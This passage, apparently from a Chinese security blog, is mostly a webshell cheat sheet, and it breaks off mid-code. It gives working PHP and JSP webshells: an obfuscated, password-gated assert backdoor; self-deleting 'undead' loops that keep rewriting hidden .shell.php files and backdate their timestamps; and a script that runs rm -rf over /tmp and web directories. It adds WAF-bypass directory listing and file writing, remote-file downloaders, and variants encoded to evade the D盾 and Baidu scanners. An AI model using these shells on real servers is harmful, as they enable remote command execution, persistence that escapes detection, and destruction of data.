class="string">&quot;PD9waHAKCSRzdHIxID0gJ2FIKFVVSChmc2RmSChVVUgoZnNkZixmZGdkZWZqZzBKKXImJUYlKl5HKnQnOwoJJHN0cjIgPSBzdHJ0cigkc3RyMSxhcnJheSgnYUgoVVVIKGZzZGZIKFVVSChmc2RmLCc9PidhcycsJ2ZkZ2RlZmpnMEopJz0+J3NlJywnciYlRiUqXkcqdCc9PidydCcpKTsKCSRzdHIzID0gc3RydHIoJHN0cjIsYXJyYXkoJ3MsJz0+J3MnLCdmZGdkZWZqZzBKKXImJUYlKl5HKic9PidlcicpKTsKCWlmKG1kNShAJF9HRVRbJ2EnXSkgPT0nZTEwYWRjMzk0OWJhNTlhYmJlNTZlMDU3ZjIwZjg4M2UnKXsKCQkkc3RyNCA9IHN0cnJldigkX1BPU1RbJ2EnXSk7CgkJJHN0cjUgPSBzdHJyZXYoJHN0cjQpOwoJCSRzdHIzKCRzdHI1KTsKICAgIH0KPz4=&quot;</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">file_put_contents(<span class="variable">$file</span>,base64_decode(<span class="variable">$shell</span>));</span><br><span class="line">usleep(<span class="number">50</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>phpinfo.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$str1</span> = <span class="string">&#x27;aH(UUH(fsdfH(UUH(fsdf,fdgdefjg0J)r&amp;%F%*^G*t&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str2</span> = strtr(<span class="variable">$str1</span>,<span class="keyword">array</span>(<span class="string">&#x27;aH(UUH(fsdfH(UUH(fsdf,&#x27;</span>=&gt;<span class="string">&#x27;as&#x27;</span>,<span class="string">&#x27;fdgdefjg0J)&#x27;</span>=&gt;<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;r&amp;%F%*^G*t&#x27;</span>=&gt;<span class="string">&#x27;rt&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str3</span> = strtr(<span class="variable">$str2</span>,<span class="keyword">array</span>(<span class="string">&#x27;s,&#x27;</span>=&gt;<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;fdgdefjg0J)r&amp;%F%*^G*&#x27;</span>=&gt;<span class="string">&#x27;er&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(md5(@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) ==<span class="string">&#x27;e10adc3949ba59abbe56e057f20f883e&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$str4</span> = strrev(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$str5</span> = strrev(<span class="variable">$str4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$str3</span>(<span class="variable">$str5</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//    e10adc3949ba59abbe56e057f20f883e的md5解密为123456，即密码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="绕-waf"><a href="#绕-waf" class="headerlink" title="绕 waf"></a>绕 waf</h3><h4 id="读取目录"><a href="#读取目录" class="headerlink" title="读取目录"></a>读取目录</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @ini_set(<span class="string">&quot;display_errors&quot;</span>,<span class="string">&quot;0&quot;</span>);@set_time_limit(<span class="number">0</span>);<span class="keyword">if</span>(PHP_VERSION&lt;<span class="string">&#x27;5.3.0&#x27;</span>)&#123;@set_magic_quotes_runtime(<span class="number">0</span>);&#125;;<span class="keyword">echo</span>(<span class="string">&quot;X@Y&quot;</span>);<span class="variable">$D</span>=<span class="string">&#x27;/var/www/html/&#x27;</span>;<span class="variable">$F</span>=@opendir(<span class="variable">$D</span>);<span class="keyword">if</span>(<span class="variable">$F</span>==<span class="literal">NULL</span>)&#123;<span class="keyword">echo</span>(<span class="string">&quot;ERROR:// Path Not Found Or No Permission!&quot;</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$M</span>=<span class="literal">NULL</span>;<span class="variable">$L</span>=<span class="literal">NULL</span>;<span class="keyword">while</span>(<span class="variable">$N</span>=@readdir(<span class="variable">$F</span>))&#123;<span class="variable">$P</span>=<span class="variable">$D</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$N</span>;<span class="variable">$T</span>=@date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>,@filemtime(<span class="variable">$P</span>));@<span class="variable">$E</span>=substr(base_convert(@fileperms(<span class="variable">$P</span>),<span class="number">10</span>,<span class="number">8</span>),-<span class="number">4</span>);<span class="variable">$R</span>=<span class="string">&quot;\t&quot;</span>.<span class="variable">$T</span>.<span class="string">&quot;\t&quot;</span>.@filesize(<span class="variable">$P</span>).<span class="string">&quot;\t&quot;</span>.<span class="variable">$E</span>.<span class="string">&quot;\n&quot;</span>;<span class="keyword">if</span>(@is_dir(<span class="variable">$P</span>))<span class="variable">$M</span>.=<span class="variable">$N</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$R</span>;<span class="keyword">else</span> <span class="variable">$L</span>.=<span class="variable">$N</span>.<span class="variable">$R</span>;&#125;<span class="keyword">echo</span> <span class="variable">$M</span>.<span class="variable">$L</span>;@closedir(<span class="variable">$F</span>);&#125;;<span class="keyword">echo</span>(<span class="string">&quot;X@Y&quot;</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><h4 id="写🐎"><a href="#写🐎" class="headerlink" title="写🐎"></a>写🐎</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @ini_set(<span class="string">&quot;display_errors&quot;</span>,<span class="string">&quot;0&quot;</span>);@set_time_limit(<span class="number">0</span>);<span class="keyword">if</span>(PHP_VERSION&lt;<span class="string">&#x27;5.3.0&#x27;</span>)&#123;@set_magic_quotes_runtime(<span class="number">0</span>);&#125;;<span class="keyword">echo</span>(<span class="string">&quot;X@Y&quot;</span>);<span class="variable">$f</span>=<span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;<span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&quot;Du1&quot;</span>];<span class="variable">$c</span>=str_replace(<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);<span class="variable">$c</span>=str_replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);<span class="variable">$buf</span>=<span class="string">&quot;&quot;</span>;<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$c</span>);<span class="variable">$i</span>+=<span class="number">2</span>)<span class="variable">$buf</span>.=urldecode(<span class="string">&#x27;%&#x27;</span>.substr(<span class="variable">$c</span>,<span class="variable">$i</span>,<span class="number">2</span>));<span class="keyword">echo</span>(@fwrite(fopen(<span class="variable">$f</span>,<span class="string">&#x27;w&#x27;</span>),<span class="variable">$buf</span>)?<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;0&#x27;</span>);;<span class="keyword">echo</span>(<span class="string">&quot;X@Y&quot;</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><h3 id="内存不死🐎"><a href="#内存不死🐎" class="headerlink" title="内存不死🐎"></a>内存不死🐎</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;/var/www/html/.shell.php&#x27;</span>;</span><br><span class="line"><span class="comment">//$file = &#x27;D:\phpstudy_pro\WWW\h\.shell.php&#x27;;</span></span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;cdd7b7420654eb16c1e1b748d5b7c5b8&quot;)&#123;@eval($_POST[\&#x27;Du1\&#x27;]);&#125;?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">file_put_contents(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line">system(<span class="string">&#x27;touch -m -d &quot;2014-10-31 13:50:11&quot; .shell.php&#x27;</span>);</span><br><span class="line">usleep(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="372a1b33f1178a24810b45076f907767"><a href="#372a1b33f1178a24810b45076f907767" class="headerlink" title="372a1b33f1178a24810b45076f907767"></a>372a1b33f1178a24810b45076f907767</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 絕世好馬</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1. write .htaccess to prevent any execution from web</span></span><br><span class="line"><span class="comment">2. rm every thing in web dir (/tmp dir  and  /var/tmp dir)</span></span><br><span class="line"><span class="comment">3. link flag to web path</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//config</span></span><br><span class="line"><span class="variable">$web_path</span> = <span class="string">&quot;/var/www/html/&quot;</span>;</span><br><span class="line"><span class="variable">$hash_1</span> = <span class="string">&quot;93ca52b2614926880c319db1ac5b1380&quot;</span>;</span><br><span class="line"><span class="variable">$flag_link</span> = <span class="variable">$web_path</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$hash_1</span>.<span class="string">&quot;.png&quot;</span>;</span><br><span class="line"><span class="variable">$htaccess_file</span> = <span class="string">&#x27;.htaccess&#x27;</span>;</span><br><span class="line"><span class="variable">$flag_path</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"><span class="variable">$htaccess</span> = <span class="string">&#x27;&lt;FilesMatch &quot;.+\.ph(p[3457]?|t|tml)$&quot;&gt;</span></span><br><span class="line"><span class="string">Deny from all</span></span><br><span class="line"><span class="string">&lt;/FilesMatch&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">TRUE</span>) &#123;&#123;</span><br><span class="line">system(<span class="string">&#x27;rm -rf /var/tmp/.* /var/tmp/* /tmp/.* /tmp/*&#x27;</span>);</span><br><span class="line"><span class="variable">$files</span> = scandir(<span class="variable">$web_path</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="string">&#x27;rm -rf&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file</span> != <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&#x27;..&#x27;</span> &amp;&amp; <span class="variable">$file</span> != <span class="variable">$htaccess_file</span> &amp;&amp; <span class="variable">$file</span> != <span class="variable">$hash_1</span>.<span class="string">&quot;.png&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$res</span> . <span class="string">&#x27; &#x27;</span> .<span class="variable">$file</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">system(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$htaccess_file</span>)!==<span class="variable">$htaccess</span>) &#123;&#123; </span><br><span class="line">    system(<span class="string">&#x27;chmod +w &#x27;</span>.<span class="variable">$htaccess_file</span>);</span><br><span class="line">    file_put_contents(<span class="variable">$htaccess_file</span>, <span class="variable">$htaccess</span>); </span><br><span class="line">    system(<span class="string">&#x27;chmod -w &#x27;</span>.<span class="variable">$htaccess_file</span>);</span><br><span class="line">&#125;&#125;</span><br><span class="line">system(<span class="string">&#x27;ln -s &#x27;</span>.<span class="variable">$flag_path</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$flag_link</span>);</span><br><span class="line">system(<span class="string">&#x27;chmod -w &#x27;</span>.<span class="variable">$flag_link</span>);</span><br><span class="line">usleep(<span class="number">5</span>);</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h2><h3 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h3><h4 id="无回显执行系统命令"><a href="#无回显执行系统命令" class="headerlink" title="无回显执行系统命令"></a>无回显执行系统命令</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;Du1&quot;</span>));%&gt;</span><br></pre></td></tr></table></figure><h4 id="有回显带密码验证"><a href="#有回显带密码验证" class="headerlink" title="有回显带密码验证"></a>有回显带密码验证</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;023&quot;</span>.equals(request.getParameter(<span class="string">&quot;passwd&quot;</span>)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;Du1&quot;</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="把字符串编码后写入指定文件"><a href="#把字符串编码后写入指定文件" class="headerlink" title="把字符串编码后写入指定文件"></a>把字符串编码后写入指定文件</h3><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="keyword">new</span> java.io.FileOutputStream(request.getParameter(<span class="string">&quot;file&quot;</span>)).write(request.getParameter(<span class="string">&quot;str&quot;</span>).getBytes());%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%<span class="keyword">new</span> java.io.FileOutputStream(application.getRealPath(<span class="string">&quot;/&quot;</span>)+<span class="string">&quot;/&quot;</span>+request.getParameter(<span class="string">&quot;file&quot;</span>)).write(request.getParameter(<span class="string">&quot;str&quot;</span>).getBytes());%&gt;</span><br></pre></td></tr></table></figure><h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="keyword">new</span> java.io.RandomAccessFile(request.getParameter(<span class="string">&quot;file&quot;</span>),<span class="string">&quot;rw&quot;</span>).write(request.getParameter(<span class="string">&quot;str&quot;</span>).getBytes()); %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%<span class="keyword">new</span> java.io.RandomAccessFile(application.getRealPath(<span class="string">&quot;/&quot;</span>)+<span class="string">&quot;/&quot;</span>+request.getParameter(<span class="string">&quot;f&quot;</span>),<span class="string">&quot;rw&quot;</span>).write(request.getParameter(<span class="string">&quot;c&quot;</span>).getBytes()); %&gt;</span><br></pre></td></tr></table></figure><h3 id="下载远程文件"><a href="#下载远程文件" class="headerlink" title="下载远程文件"></a>下载远程文件</h3><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    java.io.InputStream in = <span class="keyword">new</span> java.net.URL(request.getParameter(<span class="string">&quot;url&quot;</span>)).openStream();</span><br><span class="line">    <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    java.io.ByteArrayOutputStream baos = <span class="keyword">new</span> java.io.ByteArrayOutputStream();</span><br><span class="line">    <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">new</span> java.io.FileOutputStream(request.getParameter(<span class="string">&quot;file&quot;</span>)).write(baos.toByteArray());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>直接下载到 web 路径下：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    java.io.InputStream in = <span class="keyword">new</span> java.net.URL(request.getParameter(<span class="string">&quot;u&quot;</span>)).openStream();</span><br><span class="line">    <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    java.io.ByteArrayOutputStream baos = <span class="keyword">new</span> java.io.ByteArrayOutputStream();</span><br><span class="line">    <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">new</span> java.io.FileOutputStream(application.getRealPath(<span class="string">&quot;/&quot;</span>)+<span class="string">&quot;/&quot;</span>+ request.getParameter(<span class="string">&quot;f&quot;</span>)).write(baos.toByteArray());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="免杀-1"><a href="#免杀-1" class="headerlink" title="免杀"></a>免杀</h3><h4 id="命令执行-Jsp-bypass-D盾-amp-百度scanner"><a href="#命令执行-Jsp-bypass-D盾-amp-百度scanner" class="headerlink" title="命令执行 Jsp bypass D盾 &amp; 百度scanner"></a>命令执行 Jsp bypass D盾 &amp; 百度scanner</h4><h5 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        BASE64Decoder decoder = <span class="keyword">new</span> BASE64Decoder();</span><br><span class="line">        Class rt = Class.forName(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">&quot;amF2YS5sYW5nLlJ1bnRpbWU=&quot;</span>)));</span><br><span class="line">        Process e = (Process)</span><br><span class="line">                rt.getMethod(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">&quot;ZXhlYw==&quot;</span>)), String.class).invoke(rt.getMethod(<span class="keyword">new</span></span><br><span class="line">                        String(decoder.decodeBuffer(<span class="string">&quot;Z2V0UnVudGltZQ==&quot;</span>))).invoke(<span class="keyword">null</span>, <span class="keyword">new</span></span><br><span class="line">                        Object[]&#123;&#125;), request.getParameter(<span class="string">&quot;cmd&quot;</span>) );</span><br><span class="line">        java.io.InputStream in = e.getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span>  language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        Class rt = Class.forName(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span> &#125;));</span><br><span class="line">        Process e = (Process) rt.getMethod(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">99</span> &#125;), String.class).invoke(rt.getMethod(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span> &#125;)).invoke(<span class="keyword">null</span>), request.getParameter(<span class="string">&quot;cmd&quot;</span>) );</span><br><span class="line">        java.io.InputStream in = e.getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;<span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123; out.println(<span class="keyword">new</span> String(b)); &#125;out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="HEX"><a href="#HEX" class="headerlink" title="HEX"></a>HEX</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;javax.xml.bind.DatatypeConverter&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        Class rt = Class.forName(<span class="keyword">new</span> String(DatatypeConverter.parseHexBinary(<span class="string">&quot;6a6176612e6c616e672e52756e74696d65&quot;</span>)));</span><br><span class="line">        Process e = (Process) rt.getMethod(<span class="keyword">new</span> String(DatatypeConverter.parseHexBinary(<span class="string">&quot;65786563&quot;</span>)), String.class).invoke(rt.getMethod(<span class="keyword">new</span> String(DatatypeConverter.parseHexBinary(<span class="string">&quot;67657452756e74696d65&quot;</span>))).invoke(<span class="keyword">null</span>), request.getParameter(<span class="string">&quot;cmd&quot;</span>) );</span><br><span class="line">        java.io.InputStream in = e.getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;<span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123; out.println(<span class="keyword">new</span> String(b)); &#125;out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h4 id="冰蝎-Jsp-bypass-D盾-amp-百度scanner"><a href="#冰蝎-Jsp-bypass-D盾-amp-百度scanner" class="headerlink" title="冰蝎 Jsp bypass D盾 &amp; 百度scanner"></a>冰蝎 Jsp bypass D盾 &amp; 百度scanner</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;</span><br><span class="line">&lt;%!<span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;U(ClassLoader c)&#123;<span class="keyword">super</span>(c);&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span> []b)</span></span>&#123;<span class="keyword">return</span> <span 